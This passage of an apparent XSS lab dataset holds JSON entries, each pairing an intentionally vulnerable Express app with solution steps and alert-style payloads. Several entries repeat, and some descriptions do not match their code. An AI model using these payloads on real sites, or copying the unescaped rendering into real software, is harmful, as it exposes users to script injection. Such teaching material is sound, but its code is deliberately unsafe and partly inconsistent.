      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; let users = [{ name: 'admin', bio: 'Hello' }]; app.use(bodyParser.urlencoded({ extended: true })); app.get('/', (req, res) => { let html = '<html><body><h1>Users</h1>'; users.forEach(u => { html += `<div><span title='${u.bio}'>${u.name}</span></div>`; }); html += `<form action='/add' method='POST'><input name='name'><input name='bio'><button>Add</button></form></body></html>`; res.send(html); }); app.post('/add', (req, res) => { users.push({ name: req.body.name, bio: req.body.bio }); res.redirect('/'); }); app.listen(port);"
    },
    {
      "Lab scenario": "Reflected XSS in Email Subscription Confirmation",
      "Lab Description": "When users subscribe to the newsletter, the system reflects their email in the confirmation message without encoding it properly, allowing reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Visit the subscription confirmation page with a crafted `email` parameter.",
        "Observe the reflected email in the HTML content.",
        "Use a payload that executes JavaScript."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/confirm', (req, res) => { const email = req.query.email || 'user@example.com'; res.send(`<html><body><h2>Thanks for subscribing: ${email}</h2></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "DOM XSS in Profile Settings Preview",
      "Lab Description": "The application allows users to preview changes to their profile, including custom signatures. The signature is rendered inside innerHTML without sanitization, leading to DOM-based XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the profile preview page.",
        "Insert a malicious payload into the preview input field.",
        "Trigger JavaScript execution via innerHTML injection."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/preview', (req, res) => { res.send(`<html><body><h2>Profile Preview</h2><form><input id='sig' placeholder='Signature'><button onclick='event.preventDefault();document.getElementById(\"view\").innerHTML=document.getElementById(\"sig\").value;'>Preview</button></form><div id='view'></div></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Announcement Banner from Admin Panel",
      "Lab Description": "The admin panel allows adding an announcement banner. Content entered is saved and injected directly into the homepage without sanitization, enabling stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Access the announcement feature and insert a payload in the announcement message.",
        "Visit the homepage and check the banner content.",
        "Confirm that JavaScript executes when the page loads."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; let banner = ''; app.use(bodyParser.urlencoded({ extended: true })); app.get('/', (req, res) => { res.send(`<html><body><div class='banner'>${banner}</div><h1>Home</h1></body></html>`); }); app.get('/admin', (req, res) => { res.send(`<form method='POST'><input name='banner'><button>Update</button></form>`); }); app.post('/admin', (req, res) => { banner = req.body.banner; res.redirect('/'); }); app.listen(port);"
    },
    {
      "Lab scenario": "Online Course Platform Stored XSS in Assignment Feedback",
      "Lab Description": "The application allows instructors to leave feedback on student assignments. This feedback is rendered inside an HTML template without sanitization. The feedback field directly renders stored content, leading to stored XSS. To solve: Craft and submit a feedback entry that triggers JavaScript execution when a student views the assignment.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Login as an instructor and access the feedback form on a student's submission.",
        "Inject an XSS payload into the feedback textarea.",
        "Submit the feedback and logout.",
        "Login as the student and navigate to the assignment view page.",
        "Observe script execution upon viewing the feedback."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedbacks = {}; app.use(bodyParser.urlencoded({ extended: true })); app.get('/submit-feedback', (req, res) => { res.send('<form method=\"POST\"><textarea name=\"feedback\"></textarea><button type=\"submit\">Submit</button></form>'); }); app.post('/submit-feedback', (req, res) => { feedbacks['student1'] = req.body.feedback; res.redirect('/view-assignment'); }); app.get('/view-assignment', (req, res) => { const feedback = feedbacks['student1'] || 'No feedback yet'; res.send(`<html><body><h1>Assignment</h1><div>${feedback}</div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Custom Tooltip Renderer of CRM Application",
      "Lab Description": "The CRM system renders tooltips with dynamic content from query parameters. The tooltip content is directly injected into a JavaScript handler that updates innerHTML, introducing a DOM-based XSS vector. To solve: Inject a payload into the tooltip parameter that leads to JavaScript execution when hovering over a contact name.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open a contact page and observe the tooltip behavior.",
        "Modify the 'tooltip' query parameter to inject malicious HTML.",
        "Craft a payload that breaks the JS context and appends script.",
        "Hover over the contact to trigger the script.",
        "Confirm alert execution."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<div onclick=alert(1)>hover</div>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/contact', (req, res) => { const tooltip = req.query.tooltip || 'User Info'; res.send(`<html><body><h2 onmouseover=\"document.getElementById('tip').innerHTML='${tooltip}'\">Contact Name</h2><div id='tip'></div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Project Management Chat Mention Renderer",
      "Lab Description": "A project management tool parses mentions (e.g. @username) from chat messages and renders them as HTML. The parser fails to sanitize HTML tags embedded in usernames, enabling XSS through crafted mentions. To solve: Inject a mention that breaks out of the renderer logic and executes JavaScript.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a chat message with a malicious mention payload.",
        "Craft the mention to break the rendering logic and inject script.",
        "Observe rendering in the chat window.",
        "Trigger payload execution.",
        "Confirm XSS on affected message view."
      ],
      "payloads": [
        "@<img src=x onerror=alert(1)>",
        "@<svg/onload=alert(1)>",
        "@<iframe src=javascript:alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/chat', (req, res) => { const rendered = messages.map(m => m.replace(/@\\w+/g, u => `<b>${u}</b>`)).join('<br>'); res.send(`<form method='POST'><input name='msg'><button>Send</button></form>${rendered}`); }); app.post('/chat', (req, res) => { messages.push(req.body.msg); res.redirect('/chat'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Product Q&A Module of E-Commerce Platform",
      "Lab Description": "The e-commerce product page includes a Q&A section where users can submit questions. The submitted content is rendered in HTML without encoding. This allows attackers to submit script payloads which are then displayed to future users. To solve: Inject an XSS payload in a new question and trigger it by revisiting the product page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to a product page and submit a new question.",
        "Include a JavaScript payload in the question text.",
        "Reload the product page and view the Q&A section.",
        "Verify script execution.",
        "Confirm stored XSS behavior."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const questions = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/product', (req, res) => { const qList = questions.map(q => `<li>${q}</li>`).join(''); res.send(`<form method='POST'><input name='question'><button>Ask</button></form><ul>${qList}</ul>`); }); app.post('/product', (req, res) => { questions.push(req.body.question); res.redirect('/product'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS in Image Gallery Preview Generator",
      "Lab Description": "The image gallery application generates preview content using a hash value in the URL. The hash is parsed and injected into the DOM using innerHTML without validation. To solve: Manipulate the hash value in the URL to inject an XSS payload that executes JavaScript in the context of the gallery.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the gallery and observe the use of location.hash.",
        "Modify the URL hash with a malicious HTML snippet.",
        "Inject script via the hash fragment.",
        "Confirm execution on page load.",
        "Verify DOM XSS via innerHTML usage."
      ],
      "payloads": [
        "#<img src=x onerror=alert(1)>",
        "#<svg/onload=alert(1)>",
        "#<iframe src=javascript:alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/', (req, res) => { res.send(`<html><body><h1>Gallery</h1><div id='preview'></div><script>document.getElementById('preview').innerHTML = location.hash.substring(1);</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Profile Update XSS via Avatar URL in Gaming Community",
      "Lab Description": "The application allows users to update their profile including avatar image URL. The backend does not validate the URL format and embeds it directly into an <img> tag, enabling XSS via crafted image URLs. To solve: Inject a malicious image source that executes JavaScript when rendered.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Log in and navigate to the profile update page.",
        "Submit an avatar URL with a JavaScript-based payload.",
        "View the updated profile page where the avatar is rendered.",
        "Observe that the avatar loads from the injected payload and executes script.",
        "Confirm the payload successfully triggers in the profile display context."
      ],
      "payloads": [
        "javascript:alert(1)",
        "data:image/svg+xml,<svg/onload=alert(1)>",
        "x\" onerror=\"alert(1)"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let profile = { username: 'gamer123', avatar: 'https://cdn.example.com/default.png' }; app.get('/profile', (req, res) => { res.send(`<html><body><h1>${profile.username}</h1><img src=\"${profile.avatar}\"><form action='/update' method='POST'><input name='avatar'><button>Update</button></form></body></html>`); }); app.post('/update', (req, res) => { profile.avatar = req.body.avatar; res.redirect('/profile'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Support Chat via Hidden HTML Injection",
      "Lab Description": "A support chat widget stores and reflects recent messages without sanitization. HTML tags are allowed to style messages but scripts are not filtered effectively. To solve: Inject a hidden script that triggers when a staff member views chat history.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open the live chat interface and send a crafted message with HTML.",
        "Inject a payload into a support message that includes hidden JavaScript.",
        "Wait for the staff dashboard to load the stored chat messages.",
        "The injected payload executes when the support view is rendered.",
        "Verify XSS via alert box or payload callback."
      ],
      "payloads": [
        "<div style='display:none'><img src=x onerror=alert(1)></div>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<object data='javascript:alert(1)'></object>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/chat', (req, res) => { let history = messages.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${history}<form method='POST'><input name='msg'><button>Send</button></form></body></html>`); }); app.post('/chat', (req, res) => { messages.push(req.body.msg); res.redirect('/chat'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Tag Suggestions Feature via JSON Injection",
      "Lab Description": "The blog platform provides real-time tag suggestions. A user's custom tag input is embedded in a JavaScript array without escaping, causing JSON context injection. To solve: Inject a payload that breaks out of the array and executes JavaScript.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Go to the new post creation page and begin typing a custom tag.",
        "Observe the response contains your tag inside a JavaScript array.",
        "Inject a payload that breaks the context and appends a script.",
        "Use browser developer tools or Burp Suite to observe raw JS response.",
        "Verify script execution on the client side when suggestions render."
      ],
      "payloads": [
        "test\",\"<img src=x onerror=alert(1)>",
        "x\"]};alert(1);//",
        "foo\",\"<script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/tags', (req, res) => { const q = req.query.q || ''; res.send(`<script>let suggestions = [\"${q}\"];</script>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "Embedded Poll Widget XSS in News Portal",
      "Lab Description": "The news website embeds a poll widget that reflects the poll question in HTML. The question text comes from a GET parameter, which is inserted without sanitization. To solve: Inject an HTML-breaking payload that leads to script execution.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Craft a URL with a malicious poll question parameter.",
        "Visit the widget page with the payload in the query string.",
        "Observe the payload rendered directly in HTML context.",
        "The payload breaks the structure and triggers script execution.",
        "Confirm via visible alert or payload effect."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/poll', (req, res) => { const question = req.query.q || 'Do you like this article?'; res.send(`<html><body><h2>${question}</h2><button>Yes</button><button>No</button></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Markdown Preview XSS via Link Rendering",
      "Lab Description": "A markdown editor allows users to preview their formatted content. Links are rendered as HTML <a> tags without validating the href, enabling JavaScript URIs to be injected. To solve: Inject a markdown link with JavaScript URI and trigger XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Go to the markdown editor preview page.",
        "Enter a markdown-formatted link with a malicious href.",
        "Click preview and observe the generated link.",
        "Click the link or inspect the DOM to trigger the XSS.",
        "Confirm execution through alert or redirect."
      ],
      "payloads": [
        "[Click](javascript:alert(1))",
        "[x](data:text/html,<script>alert(1)</script>)",
        "[a](javascript:confirm(1))"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const md = require('markdown-it')(); app.post('/preview', (req, res) => { const html = md.render(req.body.content); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "User Comment System XSS via Unfiltered Input in Forum Post",
      "Lab Description": "A community forum allows users to post comments under articles. The submitted comment content is rendered on the page without proper HTML sanitization. To solve: Inject a script in the comment field and confirm it runs when viewed.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to a forum article and locate the comment form.",
        "Submit a comment containing an XSS payload.",
        "Reload the article page and locate your comment.",
        "Observe that the payload is rendered and executed.",
        "Verify the XSS was triggered through an alert or JavaScript behavior."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/article', (req, res) => { const commentHTML = comments.map(c => `<div>${c}</div>`).join(''); res.send(`<html><body><h1>Forum Article</h1>${commentHTML}<form method='POST' action='/comment'><input name='text'><button>Post</button></form></body></html>`); }); app.post('/comment', (req, res) => { comments.push(req.body.text); res.redirect('/article'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Search Result Page XSS via Reflected Query Parameter",
      "Lab Description": "The search functionality on the travel website displays the query term directly on the results page without encoding. This allows attackers to inject JavaScript through the search parameter. To solve: Inject a script in the query parameter and confirm execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Visit the search page with a crafted query string.",
        "Use an XSS payload in the query to manipulate the DOM.",
        "Observe the results page where the query is reflected unsanitized.",
        "Check whether the script executes immediately on page load.",
        "Verify XSS execution with an alert or triggered behavior."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const q = req.query.q || ''; res.send(`<html><body><h1>Search Results for ${q}</h1><div>No results found.</div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Custom Greeting Card Preview via Template Injection",
      "Lab Description": "An online greeting card maker allows users to preview a card with a custom message. The message is inserted into the HTML using template literals without escaping, allowing DOM-based XSS. To solve: Inject a payload into the message to break out of the template and execute JavaScript.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Go to the card creation form and input a crafted message.",
        "Submit and preview the card using the provided preview button.",
        "Inspect the page and find the injected message in a script context.",
        "Trigger and confirm execution of the payload.",
        "Verify the XSS using an alert or action."
      ],
      "payloads": [
        "`;alert(1)//",
        "';alert(1)//",
        "\";alert(1)//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/preview', (req, res) => { const msg = req.query.msg || 'Happy Birthday!'; res.send(`<html><head><script>let message = \"${msg}\";</script></head><body><h1>Greeting Card</h1></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Helpdesk Ticket Viewer via Subject Reflection",
      "Lab Description": "The helpdesk interface displays the subject of a ticket by reflecting a query parameter directly in HTML. No encoding or escaping is applied. To solve: Inject a script into the subject and trigger XSS on the ticket view page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the ticket viewer page using a subject query.",
        "Insert a payload into the subject parameter.",
        "Observe the reflected subject in HTML on the page.",
        "Confirm the script execution when the page loads.",
        "Verify via alert or other visible result."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/ticket', (req, res) => { const subject = req.query.subject || 'Support Inquiry'; res.send(`<html><body><h2>${subject}</h2><div>Your ticket will be reviewed shortly.</div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Notification Dropdown via Stored Alert Text",
      "Lab Description": "The web app stores notification alerts entered by users, such as system warnings or admin announcements. When rendering, the alert text is inserted into a dropdown using innerHTML, allowing stored XSS. To solve: Inject a malicious string into the alert and trigger it when the dropdown is rendered.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a crafted alert string using the notification input.",
        "Wait for a user or admin to view the notification dropdown.",
        "Observe the payload being injected via innerHTML.",
        "Trigger the dropdown to render the script.",
        "Verify execution with an alert or behavior."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let notifications = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/admin', (req, res) => { const notifHTML = notifications.map(n => `<li>${n}</li>`).join(''); res.send(`<html><body><ul id='dropdown'>${notifHTML}</ul><form method='POST'><input name='n'><button>Add</button></form></body></html>`); }); app.post('/admin', (req, res) => { notifications.push(req.body.n); res.redirect('/admin'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Image Caption Injection in Photography Portfolio",
      "Lab Description": "A photography site allows photographers to submit captions for their images. These captions are rendered in the gallery without HTML escaping. This allows an attacker to inject HTML or scripts into the gallery view. To solve: Inject a payload as a caption and verify it executes in the gallery.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the image submission form and upload a photo with a crafted caption.",
        "Navigate to the public gallery where captions are displayed.",
        "Observe the caption rendered directly into the HTML.",
        "Trigger the payload on image render.",
        "Verify XSS via alert or DOM manipulation."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let gallery = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/gallery', (req, res) => { const imgs = gallery.map(g => `<figure><img src='${g.url}'><figcaption>${g.caption}</figcaption></figure>`).join(''); res.send(`<html><body><h1>Photo Gallery</h1>${imgs}<form method='POST'><input name='url'><input name='caption'><button>Submit</button></form></body></html>`); }); app.post('/gallery', (req, res) => { gallery.push({ url: req.body.url, caption: req.body.caption }); res.redirect('/gallery'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in FAQ Accordion via Question Parameter",
      "Lab Description": "An FAQ section loads question data dynamically based on a query parameter and reflects it inside expandable accordion elements. The input is not sanitized before being injected into the HTML, enabling DOM-based XSS. To solve: Inject a script via the question parameter and trigger it when the accordion renders.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to the FAQ page with a crafted `q` parameter.",
        "Inject a payload into the parameter targeting script execution.",
        "Observe the reflected unsanitized HTML in the accordion block.",
        "Expand the accordion to trigger DOM parsing.",
        "Confirm XSS with a script execution."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "\"onmouseover=alert(1) autofocus"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/faq', (req, res) => { const q = req.query.q || 'How to reset password?'; res.send(`<html><body><h1>FAQs</h1><div class='accordion'><div class='question'>${q}</div><div class='answer'>Please follow the steps to reset your password.</div></div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Feedback Summary on Admin Dashboard",
      "Lab Description": "A user feedback form collects input and stores it in a database. The admin dashboard displays recent feedback using innerHTML without encoding. Attackers can submit malicious input that is rendered when the admin views the dashboard. To solve: Submit a payload as feedback and trigger stored XSS on admin view.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a feedback form with a crafted payload in the text field.",
        "Access the admin dashboard that lists feedback messages.",
        "Observe the feedback being injected using innerHTML.",
        "Wait for an admin to view the feedback section.",
        "Confirm the payload executes upon page load."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let feedbacks = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/admin/dashboard', (req, res) => { const content = feedbacks.map(f => `<p>${f}</p>`).join(''); res.send(`<html><body><h1>Feedback</h1>${content}</body></html>`); }); app.post('/submit-feedback', (req, res) => { feedbacks.push(req.body.msg); res.redirect('/'); }); app.get('/', (req, res) => { res.send(`<form method='POST' action='/submit-feedback'><textarea name='msg'></textarea><button>Send</button></form>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in User Badge Description Field on Profile Page",
      "Lab Description": "Users can earn badges and set custom badge descriptions. These descriptions are rendered directly in profile pages using dangerouslySetInnerHTML. Without proper validation, this leads to stored XSS. To solve: Submit a badge description with an XSS payload and view it from another profile.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set a custom badge description via profile settings.",
        "Inject a crafted payload into the badge description field.",
        "View the public-facing profile page where the description is shown.",
        "Observe unsafe rendering of the HTML content.",
        "Verify execution of the JavaScript payload."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let badgeDesc = {}; app.use(bodyParser.urlencoded({ extended: true })); app.get('/profile', (req, res) => { const user = req.query.user || 'guest'; const desc = badgeDesc[user] || 'No badge yet.'; res.send(`<html><body><h1>${user}'s Profile</h1><div class='badge'>${desc}</div></body></html>`); }); app.post('/set-badge', (req, res) => { badgeDesc[req.body.user] = req.body.desc; res.redirect(`/profile?user=${req.body.user}`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Admin Announcement Viewer via Stored HTML",
      "Lab Description": "An announcement management system allows admin users to post messages containing HTML. The messages are stored and later rendered to all users. Since there's no sanitization, stored XSS is possible. To solve: Submit a malicious announcement and verify execution on user view.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit an admin announcement with a script payload.",
        "Wait for users to view the announcement page.",
        "Observe that the announcement content is rendered raw.",
        "Trigger the payload during page load.",
        "Verify JavaScript execution to confirm XSS."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let announcements = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/announcements', (req, res) => { const list = announcements.map(a => `<div>${a}</div>`).join(''); res.send(`<html><body><h1>Announcements</h1>${list}</body></html>`); }); app.post('/admin/announce', (req, res) => { announcements.push(req.body.content); res.redirect('/announcements'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Image Caption Injection in Photography Portfolio",
      "Lab Description": "A photography site allows photographers to submit captions for their images. These captions are rendered in the gallery without HTML escaping. This allows an attacker to inject HTML or scripts into the gallery view. To solve: Inject a payload as a caption and verify it executes in the gallery.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the image submission form and upload a photo with a crafted caption.",
        "Navigate to the public gallery where captions are displayed.",
        "Observe the caption rendered directly into the HTML.",
        "Trigger the payload on image render.",
        "Verify XSS via alert or DOM manipulation."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let gallery = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/gallery', (req, res) => { const imgs = gallery.map(g => `<figure><img src='${g.url}'><figcaption>${g.caption}</figcaption></figure>`).join(''); res.send(`<html><body><h1>Photo Gallery</h1>${imgs}<form method='POST'><input name='url'><input name='caption'><button>Submit</button></form></body></html>`); }); app.post('/gallery', (req, res) => { gallery.push({ url: req.body.url, caption: req.body.caption }); res.redirect('/gallery'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in FAQ Accordion via Question Parameter",
      "Lab Description": "An FAQ section loads question data dynamically based on a query parameter and reflects it inside expandable accordion elements. The input is not sanitized before being injected into the HTML, enabling DOM-based XSS. To solve: Inject a script via the question parameter and trigger it when the accordion renders.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to the FAQ page with a crafted `q` parameter.",
        "Inject a payload into the parameter targeting script execution.",
        "Observe the reflected unsanitized HTML in the accordion block.",
        "Expand the accordion to trigger DOM parsing.",
        "Confirm XSS with a script execution."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "\"onmouseover=alert(1) autofocus"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/faq', (req, res) => { const q = req.query.q || 'How to reset password?'; res.send(`<html><body><h1>FAQs</h1><div class='accordion'><div class='question'>${q}</div><div class='answer'>Please follow the steps to reset your password.</div></div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Feedback Summary on Admin Dashboard",
      "Lab Description": "A user feedback form collects input and stores it in a database. The admin dashboard displays recent feedback using innerHTML without encoding. Attackers can submit malicious input that is rendered when the admin views the dashboard. To solve: Submit a payload as feedback and trigger stored XSS on admin view.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a feedback form with a crafted payload in the text field.",
        "Access the admin dashboard that lists feedback messages.",
        "Observe the feedback being injected using innerHTML.",
        "Wait for an admin to view the feedback section.",
        "Confirm the payload executes upon page load."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let feedbacks = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/admin/dashboard', (req, res) => { const content = feedbacks.map(f => `<p>${f}</p>`).join(''); res.send(`<html><body><h1>Feedback</h1>${content}</body></html>`); }); app.post('/submit-feedback', (req, res) => { feedbacks.push(req.body.msg); res.redirect('/'); }); app.get('/', (req, res) => { res.send(`<form method='POST' action='/submit-feedback'><textarea name='msg'></textarea><button>Send</button></form>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in User Badge Description Field on Profile Page",
      "Lab Description": "Users can earn badges and set custom badge descriptions. These descriptions are rendered directly in profile pages using dangerouslySetInnerHTML. Without proper validation, this leads to stored XSS. To solve: Submit a badge description with an XSS payload and view it from another profile.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set a custom badge description via profile settings.",
        "Inject a crafted payload into the badge description field.",
        "View the public-facing profile page where the description is shown.",
        "Observe unsafe rendering of the HTML content.",
        "Verify execution of the JavaScript payload."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let badgeDesc = {}; app.use(bodyParser.urlencoded({ extended: true })); app.get('/profile', (req, res) => { const user = req.query.user || 'guest'; const desc = badgeDesc[user] || 'No badge yet.'; res.send(`<html><body><h1>${user}'s Profile</h1><div class='badge'>${desc}</div></body></html>`); }); app.post('/set-badge', (req, res) => { badgeDesc[req.body.user] = req.body.desc; res.redirect(`/profile?user=${req.body.user}`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Admin Announcement Viewer via Stored HTML",
      "Lab Description": "An announcement management system allows admin users to post messages containing HTML. The messages are stored and later rendered to all users. Since there's no sanitization, stored XSS is possible. To solve: Submit a malicious announcement and verify execution on user view.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit an admin announcement with a script payload.",
        "Wait for users to view the announcement page.",
        "Observe that the announcement content is rendered raw.",
        "Trigger the payload during page load.",
        "Verify JavaScript execution to confirm XSS."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
